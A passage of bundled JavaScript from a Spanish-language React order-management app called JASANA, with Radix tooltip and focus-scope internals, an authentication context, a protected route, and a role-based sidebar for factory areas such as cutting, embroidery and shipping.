  }, [setOpen]);
  const handleDelayedOpen = React32.useCallback(() => {
    window.clearTimeout(openTimerRef.current);
    openTimerRef.current = window.setTimeout(() => {
      wasOpenDelayedRef.current = true;
      setOpen(true);
      openTimerRef.current = 0;
    }, delayDuration);
  }, [delayDuration, setOpen]);
  React32.useEffect(() => {
    return () => {
      if (openTimerRef.current) {
        window.clearTimeout(openTimerRef.current);
        openTimerRef.current = 0;
      }
    };
  }, []);
  return /* @__PURE__ */ jsx15(Root23, { ...popperScope, children: /* @__PURE__ */ jsx15(
    TooltipContextProvider,
    {
      scope: __scopeTooltip,
      contentId,
      open,
      stateAttribute,
      trigger,
      onTriggerChange: setTrigger,
      onTriggerEnter: React32.useCallback(() => {
        if (providerContext.isOpenDelayedRef.current) handleDelayedOpen();
        else handleOpen();
      }, [providerContext.isOpenDelayedRef, handleDelayedOpen, handleOpen]),
      onTriggerLeave: React32.useCallback(() => {
        if (disableHoverableContent) {
          handleClose();
        } else {
          window.clearTimeout(openTimerRef.current);
          openTimerRef.current = 0;
        }
      }, [handleClose, disableHoverableContent]),
      onOpen: handleOpen,
      onClose: handleClose,
      disableHoverableContent,
      children
    }
  ) });
};
Tooltip.displayName = TOOLTIP_NAME;
var TRIGGER_NAME = "TooltipTrigger";
var TooltipTrigger = React32.forwardRef(
  (props, forwardedRef) => {
    const { __scopeTooltip, ...triggerProps } = props;
    const context = useTooltipContext(TRIGGER_NAME, __scopeTooltip);
    const providerContext = useTooltipProviderContext(TRIGGER_NAME, __scopeTooltip);
    const popperScope = usePopperScope(__scopeTooltip);
    const ref = React32.useRef(null);
    const composedRefs = useComposedRefs(forwardedRef, ref, context.onTriggerChange);
    const isPointerDownRef = React32.useRef(false);
    const hasPointerMoveOpenedRef = React32.useRef(false);
    const handlePointerUp = React32.useCallback(() => isPointerDownRef.current = false, []);
    React32.useEffect(() => {
      return () => document.removeEventListener("pointerup", handlePointerUp);
    }, [handlePointerUp]);
    return /* @__PURE__ */ jsx15(Anchor, { asChild: true, ...popperScope, children: /* @__PURE__ */ jsx15(
      Primitive.button,
      {
        "aria-describedby": context.open ? context.contentId : void 0,
        "data-state": context.stateAttribute,
        ...triggerProps,
        ref: composedRefs,
        onPointerMove: composeEventHandlers(props.onPointerMove, (event) => {
          if (event.pointerType === "touch") return;
          if (!hasPointerMoveOpenedRef.current && !providerContext.isPointerInTransitRef.current) {
            context.onTriggerEnter();
            hasPointerMoveOpenedRef.current = true;
          }
        }),
        onPointerLeave: composeEventHandlers(props.onPointerLeave, () => {
          context.onTriggerLeave();
          hasPointerMoveOpenedRef.current = false;
        }),
        onPointerDown: composeEventHandlers(props.onPointerDown, () => {
          if (context.open) {
            context.onClose();
          }
          isPointerDownRef.current = true;
          document.addEventListener("pointerup", handlePointerUp, { once: true });
        }),
        onFocus: composeEventHandlers(props.onFocus, () => {
          if (!isPointerDownRef.current) context.onOpen();
        }),
        onBlur: composeEventHandlers(props.onBlur, context.onClose),
        onClick: composeEventHandlers(props.onClick, context.onClose)
      }
    ) });
  }
);
TooltipTrigger.displayName = TRIGGER_NAME;
var PORTAL_NAME2 = "TooltipPortal";
var [PortalProvider, usePortalContext] = createTooltipContext(PORTAL_NAME2, {
  forceMount: void 0
});
var TooltipPortal = (props) => {
  const { __scopeTooltip, forceMount, children, container } = props;
  const context = useTooltipContext(PORTAL_NAME2, __scopeTooltip);
  return /* @__PURE__ */ jsx15(PortalProvider, { scope: __scopeTooltip, forceMount, children: /* @__PURE__ */ jsx15(Presence, { present: forceMount || context.open, children: /* @__PURE__ */ jsx15(Portal, { asChild: true, container, children }) }) });
};
TooltipPortal.displayName = PORTAL_NAME2;
var CONTENT_NAME2 = "TooltipContent";
var TooltipContent = React32.forwardRef(
  (props, forwardedRef) => {
    const portalContext = usePortalContext(CONTENT_NAME2, props.__scopeTooltip);
    const { forceMount = portalContext.forceMount, side = "top", ...contentProps } = props;
    const context = useTooltipContext(CONTENT_NAME2, props.__scopeTooltip);
    return /* @__PURE__ */ jsx15(Presence, { present: forceMount || context.open, children: context.disableHoverableContent ? /* @__PURE__ */ jsx15(TooltipContentImpl, { side, ...contentProps, ref: forwardedRef }) : /* @__PURE__ */ jsx15(TooltipContentHoverable, { side, ...contentProps, ref: forwardedRef }) });
  }
);
var TooltipContentHoverable = React32.forwardRef((props, forwardedRef) => {
  const context = useTooltipContext(CONTENT_NAME2, props.__scopeTooltip);
  const providerContext = useTooltipProviderContext(CONTENT_NAME2, props.__scopeTooltip);
  const ref = React32.useRef(null);
  const composedRefs = useComposedRefs(forwardedRef, ref);
  const [pointerGraceArea, setPointerGraceArea] = React32.useState(null);
  const { trigger, onClose } = context;
  const content = ref.current;
  const { onPointerInTransitChange } = providerContext;
  const handleRemoveGraceArea = React32.useCallback(() => {
    setPointerGraceArea(null);
    onPointerInTransitChange(false);
  }, [onPointerInTransitChange]);
  const handleCreateGraceArea = React32.useCallback(
    (event, hoverTarget) => {
      const currentTarget = event.currentTarget;
      const exitPoint = { x: event.clientX, y: event.clientY };
      const exitSide = getExitSideFromRect(exitPoint, currentTarget.getBoundingClientRect());
      const paddedExitPoints = getPaddedExitPoints(exitPoint, exitSide);
      const hoverTargetPoints = getPointsFromRect(hoverTarget.getBoundingClientRect());
      const graceArea = getHull([...paddedExitPoints, ...hoverTargetPoints]);
      setPointerGraceArea(graceArea);
      onPointerInTransitChange(true);
    },
    [onPointerInTransitChange]
  );
  React32.useEffect(() => {
    return () => handleRemoveGraceArea();
  }, [handleRemoveGraceArea]);
  React32.useEffect(() => {
    if (trigger && content) {
      const handleTriggerLeave = (event) => handleCreateGraceArea(event, content);
      const handleContentLeave = (event) => handleCreateGraceArea(event, trigger);
      trigger.addEventListener("pointerleave", handleTriggerLeave);
      content.addEventListener("pointerleave", handleContentLeave);
      return () => {
        trigger.removeEventListener("pointerleave", handleTriggerLeave);
        content.removeEventListener("pointerleave", handleContentLeave);
      };
    }
  }, [trigger, content, handleCreateGraceArea, handleRemoveGraceArea]);
  React32.useEffect(() => {
    if (pointerGraceArea) {
      const handleTrackPointerGrace = (event) => {
        const target = event.target;
        const pointerPosition = { x: event.clientX, y: event.clientY };
        const hasEnteredTarget = trigger?.contains(target) || content?.contains(target);
        const isPointerOutsideGraceArea = !isPointInPolygon(pointerPosition, pointerGraceArea);
        if (hasEnteredTarget) {
          handleRemoveGraceArea();
        } else if (isPointerOutsideGraceArea) {
          handleRemoveGraceArea();
          onClose();
        }
      };
      document.addEventListener("pointermove", handleTrackPointerGrace);
      return () => document.removeEventListener("pointermove", handleTrackPointerGrace);
    }
  }, [trigger, content, pointerGraceArea, onClose, handleRemoveGraceArea]);
  return /* @__PURE__ */ jsx15(TooltipContentImpl, { ...props, ref: composedRefs });
});
var [VisuallyHiddenContentContextProvider, useVisuallyHiddenContentContext] = createTooltipContext(TOOLTIP_NAME, { isInside: false });
var Slottable = createSlottable("TooltipContent");
var TooltipContentImpl = React32.forwardRef(
  (props, forwardedRef) => {
    const {
      __scopeTooltip,
      children,
      "aria-label": ariaLabel,
      onEscapeKeyDown,
      onPointerDownOutside,
      ...contentProps
    } = props;
    const context = useTooltipContext(CONTENT_NAME2, __scopeTooltip);
    const popperScope = usePopperScope(__scopeTooltip);
    const { onClose } = context;
    React32.useEffect(() => {
      document.addEventListener(TOOLTIP_OPEN, onClose);
      return () => document.removeEventListener(TOOLTIP_OPEN, onClose);
    }, [onClose]);
    React32.useEffect(() => {
      if (context.trigger) {
        const handleScroll2 = (event) => {
          const target = event.target;
          if (target?.contains(context.trigger)) onClose();
        };
        window.addEventListener("scroll", handleScroll2, { capture: true });
        return () => window.removeEventListener("scroll", handleScroll2, { capture: true });
      }
    }, [context.trigger, onClose]);
    return /* @__PURE__ */ jsx15(
      DismissableLayer,
      {
        asChild: true,
        disableOutsidePointerEvents: false,
        onEscapeKeyDown,
        onPointerDownOutside,
        onFocusOutside: (event) => event.preventDefault(),
        onDismiss: onClose,
        children: /* @__PURE__ */ jsxs3(
          Content,
          {
            "data-state": context.stateAttribute,
            ...popperScope,
            ...contentProps,
            ref: forwardedRef,
            style: {
              ...contentProps.style,
              // re-namespace exposed content custom properties
              ...{
                "--radix-tooltip-content-transform-origin": "var(--radix-popper-transform-origin)",
                "--radix-tooltip-content-available-width": "var(--radix-popper-available-width)",
                "--radix-tooltip-content-available-height": "var(--radix-popper-available-height)",
                "--radix-tooltip-trigger-width": "var(--radix-popper-anchor-width)",
                "--radix-tooltip-trigger-height": "var(--radix-popper-anchor-height)"
              }
            },
            children: [
              /* @__PURE__ */ jsx15(Slottable, { children }),
              /* @__PURE__ */ jsx15(VisuallyHiddenContentContextProvider, { scope: __scopeTooltip, isInside: true, children: /* @__PURE__ */ jsx15(Root2, { id: context.contentId, role: "tooltip", children: ariaLabel || children }) })
            ]
          }
        )
      }
    );
  }
);
TooltipContent.displayName = CONTENT_NAME2;
var ARROW_NAME2 = "TooltipArrow";
var TooltipArrow = React32.forwardRef(
  (props, forwardedRef) => {
    const { __scopeTooltip, ...arrowProps } = props;
    const popperScope = usePopperScope(__scopeTooltip);
    const visuallyHiddenContentContext = useVisuallyHiddenContentContext(
      ARROW_NAME2,
      __scopeTooltip
    );
    return visuallyHiddenContentContext.isInside ? null : /* @__PURE__ */ jsx15(Arrow2, { ...popperScope, ...arrowProps, ref: forwardedRef });
  }
);
TooltipArrow.displayName = ARROW_NAME2;
function getExitSideFromRect(point, rect) {
  const top = Math.abs(rect.top - point.y);
  const bottom = Math.abs(rect.bottom - point.y);
  const right = Math.abs(rect.right - point.x);
  const left = Math.abs(rect.left - point.x);
  switch (Math.min(top, bottom, right, left)) {
    case left:
      return "left";
    case right:
      return "right";
    case top:
      return "top";
    case bottom:
      return "bottom";
    default:
      throw new Error("unreachable");
  }
}
function getPaddedExitPoints(exitPoint, exitSide, padding = 5) {
  const paddedExitPoints = [];
  switch (exitSide) {
    case "top":
      paddedExitPoints.push(
        { x: exitPoint.x - padding, y: exitPoint.y + padding },
        { x: exitPoint.x + padding, y: exitPoint.y + padding }
      );
      break;
    case "bottom":
      paddedExitPoints.push(
        { x: exitPoint.x - padding, y: exitPoint.y - padding },
        { x: exitPoint.x + padding, y: exitPoint.y - padding }
      );
      break;
    case "left":
      paddedExitPoints.push(
        { x: exitPoint.x + padding, y: exitPoint.y - padding },
        { x: exitPoint.x + padding, y: exitPoint.y + padding }
      );
      break;
    case "right":
      paddedExitPoints.push(
        { x: exitPoint.x - padding, y: exitPoint.y - padding },
        { x: exitPoint.x - padding, y: exitPoint.y + padding }
      );
      break;
  }
  return paddedExitPoints;
}
function getPointsFromRect(rect) {
  const { top, right, bottom, left } = rect;
  return [
    { x: left, y: top },
    { x: right, y: top },
    { x: right, y: bottom },
    { x: left, y: bottom }
  ];
}
function isPointInPolygon(point, polygon) {
  const { x, y } = point;
  let inside = false;
  for (let i = 0, j = polygon.length - 1; i < polygon.length; j = i++) {
    const ii = polygon[i];
    const jj = polygon[j];
    const xi = ii.x;
    const yi = ii.y;
    const xj = jj.x;
    const yj = jj.y;
    const intersect = yi > y !== yj > y && x < (xj - xi) * (y - yi) / (yj - yi) + xi;
    if (intersect) inside = !inside;
  }
  return inside;
}
function getHull(points) {
  const newPoints = points.slice();
  newPoints.sort((a, b) => {
    if (a.x < b.x) return -1;
    else if (a.x > b.x) return 1;
    else if (a.y < b.y) return -1;
    else if (a.y > b.y) return 1;
    else return 0;
  });
  return getHullPresorted(newPoints);
}
function getHullPresorted(points) {
  if (points.length <= 1) return points.slice();
  const upperHull = [];
  for (let i = 0; i < points.length; i++) {
    const p = points[i];
    while (upperHull.length >= 2) {
      const q = upperHull[upperHull.length - 1];
      const r2 = upperHull[upperHull.length - 2];
      if ((q.x - r2.x) * (p.y - r2.y) >= (q.y - r2.y) * (p.x - r2.x)) upperHull.pop();
      else break;
    }
    upperHull.push(p);
  }
  upperHull.pop();
  const lowerHull = [];
  for (let i = points.length - 1; i >= 0; i--) {
    const p = points[i];
    while (lowerHull.length >= 2) {
      const q = lowerHull[lowerHull.length - 1];
      const r2 = lowerHull[lowerHull.length - 2];
      if ((q.x - r2.x) * (p.y - r2.y) >= (q.y - r2.y) * (p.x - r2.x)) lowerHull.pop();
      else break;
    }
    lowerHull.push(p);
  }
  lowerHull.pop();
  if (upperHull.length === 1 && lowerHull.length === 1 && upperHull[0].x === lowerHull[0].x && upperHull[0].y === lowerHull[0].y) {
    return upperHull;
  } else {
    return upperHull.concat(lowerHull);
  }
}
var Provider2 = TooltipProvider;
var Content2 = TooltipContent;

// client/src/components/ui/tooltip.tsx
import { jsx as jsx16 } from "react/jsx-runtime";
var TooltipProvider2 = Provider2;
var TooltipContent2 = React33.forwardRef(({ className, sideOffset = 4, ...props }, ref) => /* @__PURE__ */ jsx16(
  Content2,
  {
    ref,
    sideOffset,
    className: cn(
      "z-50 overflow-hidden rounded-md border bg-popover px-3 py-1.5 text-sm text-popover-foreground shadow-md animate-in fade-in-0 zoom-in-95 data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=closed]:zoom-out-95 data-[side=bottom]:slide-in-from-top-2 data-[side=left]:slide-in-from-right-2 data-[side=right]:slide-in-from-left-2 data-[side=top]:slide-in-from-bottom-2 origin-[--radix-tooltip-content-transform-origin]",
      className
    ),
    ...props
  }
));
TooltipContent2.displayName = Content2.displayName;

// client/src/hooks/use-auth.tsx
import { createContext as createContext7, useContext as useContext7 } from "react";
var import_sweetalert2 = __toESM(require_sweetalert2_all(), 1);
import { jsx as jsx17 } from "react/jsx-runtime";
var AuthContext = createContext7(null);
function AuthProvider({ children }) {
  const { toast: toast2 } = useToast();
  const {
    data: user,
    error,
    isLoading
  } = useQuery({
    queryKey: ["/api/user"],
    queryFn: getQueryFn({ on401: "returnNull" })
  });
  const loginMutation = useMutation({
    mutationFn: async (credentials) => {
      const res = await apiRequest("POST", "/api/login", credentials);
      return await res.json();
    },
    onSuccess: (user2) => {
      queryClient.setQueryData(["/api/user"], user2);
      import_sweetalert2.default.fire({
        title: `\xA1Hola ${user2.name}!`,
        text: "Bienvenido al sistema JASANA",
        icon: "success",
        confirmButtonText: "Continuar",
        timer: 3e3,
        customClass: {
          popup: "font-sans"
        },
        timerProgressBar: true
      });
    },
    onError: (error2) => {
      toast2({
        title: "Error de inicio de sesi\xF3n",
        description: error2.message,
        variant: "destructive"
      });
    }
  });
  const registerMutation = useMutation({
    mutationFn: async (credentials) => {
      const res = await apiRequest("POST", "/api/register", credentials);
      return await res.json();
    },
    onSuccess: (user2) => {
      queryClient.setQueryData(["/api/user"], user2);
      import_sweetalert2.default.fire({
        title: `\xA1Hola ${user2.name}!`,
        text: "REGISTRO EXITOSO",
        icon: "success",
        confirmButtonText: "Continuar",
        timer: 3e3,
        customClass: {
          popup: "font-sans"
        },
        timerProgressBar: true
      });
    },
    onError: (error2) => {
      toast2({
        title: "Error de registro",
        description: error2.message,
        variant: "destructive"
      });
    }
  });
  const logoutMutation = useMutation({
    mutationFn: async () => {
      await apiRequest("POST", "/api/logout");
    },
    onSuccess: () => {
      queryClient.setQueryData(["/api/user"], null);
      toast2({
        title: "Sesi\xF3n cerrada",
        description: "Has cerrado sesi\xF3n exitosamente"
      });
    },
    onError: (error2) => {
      toast2({
        title: "Error al cerrar sesi\xF3n",
        description: error2.message,
        variant: "destructive"
      });
    }
  });
  return /* @__PURE__ */ jsx17(
    AuthContext.Provider,
    {
      value: {
        user: user ?? null,
        isLoading,
        error,
        loginMutation,
        logoutMutation,
        registerMutation
      },
      children
    }
  );
}
function useAuth() {
  const context = useContext7(AuthContext);
  if (!context) {
    throw new Error("useAuth must be used within an AuthProvider");
  }
  return context;
}

// client/src/lib/protected-route.tsx
import { jsx as jsx18 } from "react/jsx-runtime";
function ProtectedRoute({
  path,
  component: Component
}) {
  const { user, isLoading } = useAuth();
  if (isLoading) {
    return /* @__PURE__ */ jsx18(Route, { path, children: /* @__PURE__ */ jsx18("div", { className: "flex items-center justify-center min-h-screen", children: /* @__PURE__ */ jsx18(LoaderCircle, { className: "h-8 w-8 animate-spin text-border" }) }) });
  }
  if (!user) {
    return /* @__PURE__ */ jsx18(Route, { path, children: /* @__PURE__ */ jsx18(Redirect, { to: "/auth" }) });
  }
  return /* @__PURE__ */ jsx18(Route, { path, component: Component });
}

// client/src/pages/dashboard.tsx
import { useState as useState28 } from "react";

// client/src/components/layout/layout.tsx
import { useState as useState25 } from "react";

// client/src/components/ui/button.tsx
import * as React34 from "react";
import { jsx as jsx19 } from "react/jsx-runtime";
var buttonVariants = cva(
  "inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium ring-offset-background transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 [&_svg]:pointer-events-none [&_svg]:size-4 [&_svg]:shrink-0",
  {
    variants: {
      variant: {
        default: "bg-primary text-primary-foreground hover:bg-primary/90",
        destructive: "bg-destructive text-destructive-foreground hover:bg-destructive/90",
        outline: "border border-input bg-background hover:bg-accent hover:text-accent-foreground",
        secondary: "bg-secondary text-secondary-foreground hover:bg-secondary/80",
        ghost: "hover:bg-accent hover:text-accent-foreground",
        link: "text-primary underline-offset-4 hover:underline"
      },
      size: {
        default: "h-10 px-4 py-2",
        sm: "h-9 rounded-md px-3",
        lg: "h-11 rounded-md px-8",
        icon: "h-10 w-10"
      }
    },
    defaultVariants: {
      variant: "default",
      size: "default"
    }
  }
);
var Button = React34.forwardRef(
  ({ className, variant, size: size4, asChild = false, ...props }, ref) => {
    const Comp = asChild ? Slot : "button";
    return /* @__PURE__ */ jsx19(
      Comp,
      {
        className: cn(buttonVariants({ variant, size: size4, className })),
        ref,
        ...props
      }
    );
  }
);
Button.displayName = "Button";

// client/src/components/ui/badge.tsx
import { jsx as jsx20 } from "react/jsx-runtime";
var badgeVariants = cva(
  "inline-flex items-center rounded-full border px-2.5 py-0.5 text-xs font-semibold transition-colors focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2",
  {
    variants: {
      variant: {
        default: "border-transparent bg-primary text-primary-foreground hover:bg-primary/80",
        secondary: "border-transparent bg-secondary text-secondary-foreground hover:bg-secondary/80",
        destructive: "border-transparent bg-destructive text-destructive-foreground hover:bg-destructive/80",
        outline: "text-foreground"
      }
    },
    defaultVariants: {
      variant: "default"
    }
  }
);
function Badge({ className, variant, ...props }) {
  return /* @__PURE__ */ jsx20("div", { className: cn(badgeVariants({ variant }), className), ...props });
}

// client/src/components/layout/sidebar.tsx
import { jsx as jsx21, jsxs as jsxs4 } from "react/jsx-runtime";
function Sidebar({ onShowNotifications, onCreateOrder }) {
  const { user, logoutMutation } = useAuth();
  const [location2, setLocation] = useLocation();
  const { data: pendingTransfers = [] } = useQuery({
    queryKey: ["/api/transfers/pending"],
    enabled: !!user,
    refetchInterval: 1e4,
    // Refetch cada 10 segundos
    refetchOnWindowFocus: true
  });
  const { data: repositionNotifications = [] } = useQuery({
    queryKey: ["/api/notifications"],
    enabled: !!user,
    refetchInterval: 1e4,
    // Refetch cada 10 segundos
    refetchOnWindowFocus: true,
    queryFn: async () => {
      const res = await fetch("/api/notifications", {
        credentials: "include"
      });
      if (!res.ok) {
        console.error("Error fetching notifications:", res.status);
        return [];
      }
      const allNotifications = await res.json();
      console.log("All notifications:", allNotifications);
      const filteredNotifications = allNotifications.filter(
        (n) => !n.read && (n.type?.includes("reposition") || n.type?.includes("completion") || n.type === "new_reposition" || n.type === "reposition_transfer" || n.type === "reposition_approved" || n.type === "reposition_rejected" || n.type === "reposition_completed" || n.type === "reposition_deleted" || n.type === "completion_approval_needed")
      );
      console.log("Filtered reposition notifications:", filteredNotifications);
      return filteredNotifications;
    }
  });
  const { data: pendingRepositions = [] } = useQuery({
    queryKey: ["/api/repositions/pending-count"],
    enabled: !!user && (user.area === "admin" || user.area === "envios" || user.area === "operaciones"),
    refetchInterval: 1e4,
    refetchOnWindowFocus: true,
    queryFn: async () => {
      const res = await fetch("/api/repositions/pending-count", {
        credentials: "include"
      });
      if (!res.ok) return [];
      const data = await res.json();
      return data.repositions || [];
    }
  });
  const canCreateOrders = user?.area === "corte" || user?.area === "admin";
  const isAdmin = user?.area === "admin";
  const getAreaDisplayName = (area) => {
    const names = {
      corte: "Corte",
      bordado: "Bordado",
      ensamble: "Ensamble",
      plancha: "Plancha/Empaque",
      calidad: "Calidad",
      envios: "Env\xEDos",
      admin: "Admin",
      operaciones: "Operaciones",
      almacen: "Almac\xE9n",
      dise\u00F1o: "Dise\xF1o"
    };
    return names[area] || area;
  };
  return /* @__PURE__ */ jsxs4("aside", { className: "w-64 bg-white shadow-lg fixed h-full z-10", children: [
    /* @__PURE__ */ jsx21("div", { className: "p-6 border-b border-gray-200", children: /* @__PURE__ */ jsxs4("div", { className: "flex items-center space-x-3", children: [
      /* @__PURE__ */ jsx21("div", { className: "w-12 h-12 rounded-lg flex items-center justify-center", style: { backgroundColor: "#F2F2F2" }, children: /* @__PURE__ */ jsx21("img", { src: "../../../public/logo.svg", alt: "F\xE1brica", className: "w-10 h-10" }) }),
      /* @__PURE__ */ jsxs4("div", { children: [
        /* @__PURE__ */ jsx21("h1", { className: "text-xl font-bold text-gray-800", children: "JASANA" }),
        /* @__PURE__ */ jsx21("p", { className: "text-sm text-gray-500", children: "Sistema de Pedidos" })
      ] })
    ] }) }),
    /* @__PURE__ */ jsx21("div", { className: "p-4 border-b border-gray-200 bg-gray-50", children: /* @__PURE__ */ jsxs4("div", { className: "flex items-center space-x-3", children: [
      /* @__PURE__ */ jsx21("div", { className: "w-8 h-8 bg-primary rounded-full flex items-center justify-center", children: /* @__PURE__ */ jsx21(User, { className: "text-white text-sm" }) }),
      /* @__PURE__ */ jsxs4("div", { children: [
        /* @__PURE__ */ jsx21("p", { className: "font-semibold text-gray-800", children: user?.name }),
        /* @__PURE__ */ jsxs4("p", { className: "text-sm text-gray-500", children: [
          "\xC1rea: ",
          user?.area ? getAreaDisplayName(user.area) : ""
        ] }),
        /* @__PURE__ */ jsx21(
          "a",
          {
            href: `msteams:/l/chat/0/0?users=${user?.username}`,
            children: /* @__PURE__ */ jsx21("button", { className: "mt-2 px-3 py-1 bg-blue-600 text-white text-sm rounded hover:bg-blue-700", children: "Chatear en Teams" })
          }
        )
      ] })
    ] }) }),
    /* @__PURE__ */ jsx21("nav", { className: "p-4", children: /* @__PURE__ */ jsxs4("ul", { className: "space-y-2", children: [
      /* @__PURE__ */ jsx21("li", { children: /* @__PURE__ */ jsxs4(
        Button,
        {
          variant: "ghost",
          className: `w-full justify-start ${location2 === "/" ? "bg-primary text-white hover:bg-primary/90" : ""}`,
          onClick: () => setLocation("/"),
          children: [
            /* @__PURE__ */ jsx21(House, { className: "mr-3 h-4 w-4" }),
            "Tablero"
          ]
        }
      ) }),
      /* @__PURE__ */ jsx21("li", { children: /* @__PURE__ */ jsxs4(
        Button,
        {
          variant: "ghost",
          className: `w-full justify-start ${location2 === "/orders" ? "bg-primary text-white hover:bg-primary/90" : ""}`,
          onClick: () => setLocation("/orders"),
          children: [
            /* @__PURE__ */ jsx21(Package, { className: "mr-3 h-4 w-4" }),
            "Pedidos"
          ]
        }
      ) }),
      /* @__PURE__ */ jsx21("li", { children: /* @__PURE__ */ jsxs4(
        Button,
        {
          variant: "ghost",
          className: "w-full justify-start relative",
          onClick: onShowNotifications,
          children: [
            /* @__PURE__ */ jsx21(Bell, { className: "mr-3 h-4 w-4" }),
            "Notificaciones",
            pendingTransfers.length > 0 && /* @__PURE__ */ jsx21(
              Badge,
              {
                variant: "destructive",
                className: "absolute -top-1 -right-1 h-5 w-5 flex items-center justify-center p-0 text-xs",
                children: pendingTransfers.length
              }
            )
          ]
        }
      ) }),
      /* @__PURE__ */ jsx21("li", { children: /* @__PURE__ */ jsxs4(
        Button,
        {
          variant: "ghost",
          className: `w-full justify-start relative ${location2 === "/repositions" ? "bg-primary text-white hover:bg-primary/90" : ""}`,
          onClick: () => setLocation("/repositions"),
          children: [
            /* @__PURE__ */ jsx21(FilePen, { className: "mr-3 h-4 w-4" }),
            "Reposiciones",
            (repositionNotifications.length > 0 || pendingRepositions.length > 0) && /* @__PURE__ */ jsxs4("div", { className: "absolute -top-1 -right-1 flex gap-1", children: [
              repositionNotifications.length > 0 && /* @__PURE__ */ jsx21(
                Badge,
                {
                  variant: "destructive",
                  className: "h-5 w-5 flex items-center justify-center p-0 text-xs",
                  title: "Notificaciones de reposici\xF3n",
                  children: repositionNotifications.length
                }
              ),
              pendingRepositions.length > 0 && (user?.area === "admin" || user?.area === "envios" || user?.area === "operaciones") && /* @__PURE__ */ jsx21(
                Badge,
                {
                  variant: "secondary",
                  className: "h-5 w-5 flex items-center justify-center p-0 text-xs bg-orange-500 text-white hover:bg-orange-600",
                  title: "Reposiciones pendientes de aprobaci\xF3n",
                  children: pendingRepositions.length
                }
              )
            ] })
          ]
        }
      ) }),
      /* @__PURE__ */ jsx21("li", { children: /* @__PURE__ */ jsxs4(
        Button,
        {
          variant: "ghost",
          className: `w-full justify-start ${location2 === "/history" ? "bg-primary text-white hover:bg-primary/90" : ""}`,
          onClick: () => setLocation("/history"),
          children: [
            /* @__PURE__ */ jsx21(History, { className: "mr-3 h-4 w-4" }),
            "Historial"
          ]
        }
      ) }),
      /* @__PURE__ */ jsx21("li", { children: /* @__PURE__ */ jsxs4(
        Button,
        {
          variant: "ghost",
          className: `w-full justify-start ${location2 === "/agenda" ? "bg-primary text-white hover:bg-primary/90" : ""}`,
          onClick: () => setLocation("/agenda"),
          children: [
            /* @__PURE__ */ jsx21(Calendar, { className: "mr-3 h-4 w-4" }),
            "Agenda"
          ]
        }
      ) }),
      canCreateOrders && /* @__PURE__ */ jsx21("li", { children: /* @__PURE__ */ jsxs4(
        Button,
        {
          variant: "ghost",
          className: "w-full justify-start",
          onClick: onCreateOrder,
          children: [
            /* @__PURE__ */ jsx21(Plus, { className: "mr-3 h-4 w-4" }),
            "Crear Pedido"
          ]
        }
      ) }),
      isAdmin && /* @__PURE__ */ jsx21("li", { children: /* @__PURE__ */ jsxs4(
        Button,
        {
          variant: "ghost",
          className: `w-full justify-start ${location2 === "/admin" ? "bg-primary text-white hover:bg-primary/90" : ""}`,
          onClick: () => setLocation("/admin"),
          children: [
            /* @__PURE__ */ jsx21(Settings, { className: "mr-3 h-4 w-4" }),
            "Administraci\xF3n"
          ]
        }
      ) })
    ] }) }),
    /* @__PURE__ */ jsx21("div", { className: "absolute bottom-4 left-4 right-4", children: /* @__PURE__ */ jsxs4(
      Button,
      {
        variant: "ghost",
        className: "w-full justify-start",
        onClick: () => logoutMutation.mutate(),
        disabled: logoutMutation.isPending,
        children: [
          /* @__PURE__ */ jsx21(LogOut, { className: "mr-3 h-4 w-4" }),
          "Cerrar Sesi\xF3n"
        ]
      }
    ) })
  ] });
}

// client/src/components/ui/sheet.tsx
import * as React45 from "react";

// node_modules/@radix-ui/react-dialog/dist/index.mjs
import * as React44 from "react";

// node_modules/@radix-ui/react-focus-scope/dist/index.mjs
import * as React35 from "react";
import { jsx as jsx23 } from "react/jsx-runtime";
var AUTOFOCUS_ON_MOUNT = "focusScope.autoFocusOnMount";
var AUTOFOCUS_ON_UNMOUNT = "focusScope.autoFocusOnUnmount";
var EVENT_OPTIONS = { bubbles: false, cancelable: true };
var FOCUS_SCOPE_NAME = "FocusScope";
var FocusScope = React35.forwardRef((props, forwardedRef) => {
  const {
    loop = false,
    trapped = false,
    onMountAutoFocus: onMountAutoFocusProp,
    onUnmountAutoFocus: onUnmountAutoFocusProp,
    ...scopeProps
  } = props;
  const [container, setContainer] = React35.useState(null);
  const onMountAutoFocus = useCallbackRef(onMountAutoFocusProp);
  const onUnmountAutoFocus = useCallbackRef(onUnmountAutoFocusProp);
  const lastFocusedElementRef = React35.useRef(null);
  const composedRefs = useComposedRefs(forwardedRef, (node) => setContainer(node));
  const focusScope = React35.useRef({
    paused: false,
    pause() {
      this.paused = true;
    },
    resume() {
      this.paused = false;
    }
  }).current;
  React35.useEffect(() => {
    if (trapped) {
      let handleFocusIn2 = function(event) {
        if (focusScope.paused || !container) return;
        const target = event.target;
        if (container.contains(target)) {
          lastFocusedElementRef.current = target;
        } else {
          focus(lastFocusedElementRef.current, { select: true });
        }
      }, handleFocusOut2 = function(event) {
        if (focusScope.paused || !container) return;
        const relatedTarget = event.relatedTarget;
        if (relatedTarget === null) return;
        if (!container.contains(relatedTarget)) {
          focus(lastFocusedElementRef.current, { select: true });
        }
      }, handleMutations2 = function(mutations) {
        const focusedElement = document.activeElement;
        if (focusedElement !== document.body) return;
        for (const mutation of mutations) {
          if (mutation.removedNodes.length > 0) focus(container);
        }
      };
      var handleFocusIn = handleFocusIn2, handleFocusOut = handleFocusOut2, handleMutations = handleMutations2;
      document.addEventListener("focusin", handleFocusIn2);
      document.addEventListener("focusout", handleFocusOut2);
      const mutationObserver = new MutationObserver(handleMutations2);
      if (container) mutationObserver.observe(container, { childList: true, subtree: true });
      return () => {
        document.removeEventListener("focusin", handleFocusIn2);
        document.removeEventListener("focusout", handleFocusOut2);
        mutationObserver.disconnect();
      };
    }
  }, [trapped, container, focusScope.paused]);
  React35.useEffect(() => {
    if (container) {
      focusScopesStack.add(focusScope);
      const previouslyFocusedElement = document.activeElement;
      const hasFocusedCandidate = container.contains(previouslyFocusedElement);
      if (!hasFocusedCandidate) {
        const mountEvent = new CustomEvent(AUTOFOCUS_ON_MOUNT, EVENT_OPTIONS);
        container.addEventListener(AUTOFOCUS_ON_MOUNT, onMountAutoFocus);
        container.dispatchEvent(mountEvent);
        if (!mountEvent.defaultPrevented) {
          focusFirst2(removeLinks(getTabbableCandidates2(container)), { select: true });
